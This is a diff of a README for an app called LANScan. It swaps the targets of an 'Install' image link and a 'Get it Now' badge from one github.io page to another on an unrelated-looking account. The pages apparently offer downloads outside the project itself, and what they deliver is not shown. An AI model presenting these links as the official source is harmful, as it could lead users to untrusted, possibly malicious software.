@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/lANScan)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/lANScan)
 
 </div>
 
@@ -81,7 +81,7 @@ LANScan's vendor identification from MAC addresses is its most immediately usefu
 
 <p align="center">
 
-[![Get it Now LANScan](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/lANScan)
+[![Get it Now LANScan](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/lANScan)
 
 </p>
 
